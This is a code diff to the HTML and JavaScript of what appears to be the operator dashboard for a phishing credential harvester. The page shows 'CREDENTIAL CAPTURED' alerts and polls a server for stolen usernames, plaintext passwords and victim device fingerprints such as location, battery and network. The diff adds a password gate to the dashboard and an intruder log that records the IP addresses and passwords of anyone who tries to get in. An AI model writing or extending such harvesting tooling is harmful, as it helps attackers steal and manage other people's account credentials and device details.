@@ -1068,7 +1068,199 @@
             opacity: .15;
             cursor: not-allowed
         }
+
+        /* AUTH OVERLAY */
+        .auth-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .92);
+            z-index: 100000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Share Tech Mono', monospace;
+            transition: opacity .3s ease
+        }
+
+        .auth-box {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            padding: 40px;
+            text-align: center;
+            max-width: 360px;
+            width: 90%;
+            position: relative
+        }
+
+        .auth-icon {
+            font-size: 32px;
+            margin-bottom: 16px;
+            line-height: 1
+        }
+
+        .auth-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            color: #00ff41;
+            margin-bottom: 8px;
+            letter-spacing: .1em
+        }
+
+        .auth-subtitle {
+            font-size: 11px;
+            color: #444;
+            margin-bottom: 24px;
+            letter-spacing: .1em
+        }
+
+        .auth-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #111;
+            border: 1px solid #333;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 16px;
+            text-align: center;
+            letter-spacing: .1em;
+            border-radius: 0;
+            -webkit-appearance: none
+        }
+
+        .auth-input:focus {
+            border-color: #00ff41
+        }
+
+        .auth-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px;
+            letter-spacing: .2em;
+            cursor: pointer;
+            outline: none;
+            transition: all .2s;
+            -webkit-tap-highlight-color: transparent
+        }
+
+        .auth-btn:hover {
+            background: rgba(0, 255, 65, .08)
+        }
+
+        .auth-btn:active {
+            transform: scale(.97)
+        }
+
+        .auth-btn:disabled {
+            opacity: .4;
+            cursor: not-allowed
+        }
+
+        .auth-error {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #ff1a1a;
+            min-height: 16px;
+            letter-spacing: .05em
+        }
+
+        .auth-hint {
+            margin-top: 8px;
+            font-size: 9px;
+            color: #333;
+            letter-spacing: .05em
+        }
+
+        .auth-debug {
+            margin-top: 12px;
+            padding: 10px;
+            background: #111;
+            border: 1px solid #222;
+            font-size: 9px;
+            color: #555;
+            text-align: left;
+            max-height: 100px;
+            overflow-y: auto;
+            font-family: 'Share Tech Mono', monospace;
+        }
+
+        .auth-debug div {
+            margin-bottom: 3px;
+        }
+
+        /* INTRUDER PANEL */
+        #intruderPanel {
+            width: 100%;
+            max-width: 600px;
+            margin-bottom: 10px;
+            display: none
+        }
+
+        #intruderPanel.show {
+            display: block;
+            animation: fu .4s ease-out
+        }
+
+        .ip-box {
+            border: 1px solid #8b0000;
+            background: #120000;
+            padding: 14px 18px;
+            position: relative
+        }
+
+        .ip-box::before {
+            content: 'INTRUDER LOG';
+            position: absolute;
+            top: -9px;
+            left: 14px;
+            font-size: 8px;
+            color: #8b0000;
+            letter-spacing: .2em;
+            background: #000;
+            padding: 0 7px
+        }
+
+        .ip-row {
+            display: grid;
+            grid-template-columns: 70px 1fr 1fr;
+            gap: 10px;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(139, 0, 0, .15);
+            font-size: 10px;
+            animation: fpIn .3s ease-out
+        }
+
+        .ip-row:last-child {
+            border-bottom: none
+        }
+
+        .ip-time {
+            color: #444
+        }
+
+        .ip-ip {
+            color: #ffaa00
+        }
+
+        .ip-pw {
+            color: #ff1a1a;
+            word-break: break-all
+        }
+
+        .ip-empty {
+            font-size: 10px;
+            color: #333;
+            text-align: center;
+            padding: 8px;
+            letter-spacing: .1em
+        }
     </style>
+    <base target="_blank">
 </head>
 
 <body>
@@ -1080,6 +1272,20 @@
         <div id="vt">⚠ CREDENTIAL CAPTURED</div>
         <div id="vs">Account Compromised — Exfiltration Complete</div>
         <div class="vl"></div>
+    </div>
+
+    <!-- AUTH OVERLAY -->
+    <div id="authOverlay" class="auth-overlay">
+        <div class="auth-box">
+            <div class="auth-icon">🔒</div>
+            <div class="auth-title">NET/RECV CONSOLE</div>
+            <div class="auth-subtitle">ENTER ACCESS CODE TO CONTINUE</div>
+            <input type="password" id="authInput" class="auth-input" placeholder="••••••••" autocomplete="off" />
+            <button id="authBtn" class="auth-btn" onclick="doAuth()">UNLOCK</button>
+            <div id="authError" class="auth-error"></div>
+            <div id="authHint" class="auth-hint"></div>
+            <div id="authDebug" class="auth-debug" style="display:none;"></div>
+        </div>
     </div>
 
     <div id="app">
@@ -1212,6 +1418,12 @@
                         </div>
                     </div>
 
+                    <div id="intruderPanel">
+                        <div class="ip-box">
+                            <div id="ipList"></div>
+                        </div>
+                    </div>
+
                     <div id="ri">
                         <span id="fts">—</span>
                         <span>|</span>
@@ -1273,7 +1485,6 @@
 
         // ═══ STATE ═══
         var _cnt = 0, _capT = null, _pw = '', _active = false, _lastTs = '';
-
         setInterval(function () {
             if (_capT) { var s = Math.floor((Date.now() - _capT) / 1000); document.getElementById('rcpt').textContent = s < 60 ? s + 's' : Math.floor(s / 60) + 'm ' + s % 60 + 's'; }
         }, 1000);
@@ -1376,28 +1587,10 @@
             document.getElementById('idot').classList.remove('red'); document.getElementById('btnclr').disabled = true;
             var idl = document.getElementById('idle'); idl.style.display = ''; idl.style.opacity = '0'; idl.style.pointerEvents = '';
             setTimeout(function () { idl.style.opacity = '1'; }, 30);
-            fetch('/clear', { method: 'POST' }).catch(function () { });
+            document.getElementById('intruderPanel').classList.remove('show');
+            document.getElementById('ipList').innerHTML = '';
+            fetch('/clear', { method: 'POST', headers: { 'X-Password': _authPassword } }).catch(function () { });
         }
-
-        // ═══ POLL SERVER ═══
-        setInterval(function () {
-            fetch('/api/data').then(function (r) { return r.json(); }).then(function (arr) {
-                if (!Array.isArray(arr) || arr.length === 0) return;
-                var newEntries = arr.filter(function (item) { return item.timestamp > _lastTs; });
-                if (newEntries.length > 0) {
-                    newEntries.forEach(function (item) {
-                        var t = new Date(item.timestamp);
-                        var fp = item.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
-                        addLog(item.username, item.password, t, fp);
-                    });
-                    var latest = arr[arr.length - 1];
-                    var lt = new Date(latest.timestamp);
-                    var lfp = latest.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
-                    showCred(latest.username, latest.password, lt, lfp, (Date.now() - lt.getTime()) < 5000);
-                    _lastTs = latest.timestamp; _active = true;
-                }
-            }).catch(function () { });
-        }, 1000);
 
         // ═══ SIMULATE ═══
         var DEMOS = [
@@ -1410,7 +1603,172 @@
         function simulate() {
             var d = DEMOS[_di % DEMOS.length]; _di++;
             fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: d.u, password: d.p, fingerprint: d.fp }) })
+                .then(function (r) { return r.json(); })
+                .then(function () { var t = new Date(); addLog(d.u, d.p, t, d.fp); showCred(d.u, d.p, t, d.fp, true); })
                 .catch(function () { var t = new Date(); addLog(d.u, d.p, t, d.fp); showCred(d.u, d.p, t, d.fp, true); });
+        }
+
+        // ═══════════════════════════════════
+        //  AUTHENTICATION — PASSWORD GATE
+        // ═══════════════════════════════════
+        var _authPassword = '';
+        var _isUnlocked = false;
+
+        function logDebug(msg) {
+            var debug = document.getElementById('authDebug');
+            var line = document.createElement('div');
+            line.textContent = '> ' + msg;
+            debug.appendChild(line);
+            debug.style.display = 'block';
+            debug.scrollTop = debug.scrollHeight;
+        }
+
+        function doAuth() {
+            var input = document.getElementById('authInput');
+            var error = document.getElementById('authError');
+            var hint = document.getElementById('authHint');
+            var btn = document.getElementById('authBtn');
+            var pw = input.value.trim();
+
+            if (!pw) {
+                error.textContent = 'Enter access code';
+                hint.textContent = '';
+                input.focus();
+                return;
+            }
+
+            btn.textContent = 'VERIFYING...';
+            btn.disabled = true;
+            error.textContent = '';
+            hint.textContent = '';
+
+            var startTime = Date.now();
+            logDebug('Sending POST /auth with password');
+
+            fetch('/auth', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pw })
+            })
+                .then(function (r) {
+                    logDebug('Response: ' + r.status + ' ' + r.statusText);
+                    logDebug('Content-Type: ' + (r.headers.get('content-type') || 'none'));
+
+                    var contentType = r.headers.get('content-type') || '';
+                    if (!contentType.includes('application/json')) {
+                        return r.text().then(function (text) {
+                            logDebug('Non-JSON response: ' + text.slice(0, 100));
+                            throw new Error('Server returned ' + r.status + ' with non-JSON: ' + text.slice(0, 50));
+                        });
+                    }
+                    return r.json().then(function (data) {
+                        if (!r.ok) {
+                            throw new Error(data.message || 'Server error ' + r.status);
+                        }
+                        return data;
+                    });
+                })
+                .then(function (data) {
+                    logDebug('Parsed: success=' + data.success);
+                    if (data.success) {
+                        _authPassword = pw;
+                        _isUnlocked = true;
+                        var overlay = document.getElementById('authOverlay');
+                        overlay.style.opacity = '0';
+                        setTimeout(function () {
+                            overlay.style.display = 'none';
+                        }, 300);
+                        startPolling();
+                    } else {
+                        error.textContent = 'Wrong Password, try again';
+                        input.value = '';
+                        input.focus();
+                    }
+                })
+                .catch(function (err) {
+                    console.error('Auth error:', err);
+                    logDebug('ERROR: ' + err.message);
+                    error.textContent = 'Connection failed — check console (F12)';
+                    hint.textContent = 'Server running? Try: node server.js';
+                })
+                .finally(function () {
+                    btn.textContent = 'UNLOCK';
+                    btn.disabled = false;
+                    logDebug('Done in ' + (Date.now() - startTime) + 'ms');
+                });
+        }
+
+        document.getElementById('authInput').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') doAuth();
+        });
+
+        // ═══════════════════════════════════
+        //  POLLING (AUTH-PROTECTED)
+        // ═══════════════════════════════════
+        function startPolling() {
+            // Poll credentials
+            setInterval(function () {
+                if (!_isUnlocked) return;
+                fetch('/api/data', { headers: { 'X-Password': _authPassword } })
+                    .then(function (r) {
+                        if (r.status === 403) { location.reload(); return Promise.reject('Auth lost'); }
+                        return r.json();
+                    })
+                    .then(function (arr) {
+                        if (!Array.isArray(arr) || arr.length === 0) return;
+                        var newEntries = arr.filter(function (item) { return item.timestamp > _lastTs; });
+                        if (newEntries.length > 0) {
+                            newEntries.forEach(function (item) {
+                                var t = new Date(item.timestamp);
+                                var fp = item.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
+                                addLog(item.username, item.password, t, fp);
+                            });
+                            var latest = arr[arr.length - 1];
+                            var lt = new Date(latest.timestamp);
+                            var lfp = latest.fingerprint || { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' };
+                            showCred(latest.username, latest.password, lt, lfp, (Date.now() - lt.getTime()) < 5000);
+                            _lastTs = latest.timestamp; _active = true;
+                        }
+                    })
+                    .catch(function () { });
+            }, 1000);
+
+            // Poll intruders
+            setInterval(function () {
+                if (!_isUnlocked) return;
+                fetch('/api/intruders', { headers: { 'X-Password': _authPassword } })
+                    .then(function (r) {
+                        if (r.status === 403) { return Promise.reject('Auth lost'); }
+                        return r.json();
+                    })
+                    .then(function (arr) {
+                        if (!Array.isArray(arr)) return;
+                        renderIntruders(arr);
+                    })
+                    .catch(function () { });
+            }, 2000);
+        }
+
+        // ═══════════════════════════════════
+        //  INTRUDER LOG RENDERER
+        // ═══════════════════════════════════
+        function renderIntruders(arr) {
+            var panel = document.getElementById('intruderPanel');
+            var list = document.getElementById('ipList');
+            if (arr.length === 0) { panel.classList.remove('show'); return; }
+            panel.classList.add('show');
+            list.innerHTML = '';
+            var recent = arr.slice().reverse().slice(0, 5);
+            recent.forEach(function (item) {
+                var row = document.createElement('div');
+                row.className = 'ip-row';
+                var t = new Date(item.timestamp);
+                var timeStr = t.toLocaleTimeString();
+                row.innerHTML = '<div class="ip-time">' + timeStr + '</div>' +
+                    '<div class="ip-ip">' + (item.ip || 'Unknown') + '</div>' +
+                    '<div class="ip-pw">"' + (item.attemptedPassword || '') + '"</div>';
+                list.appendChild(row);
+            });
         }
     </script>
 </body>
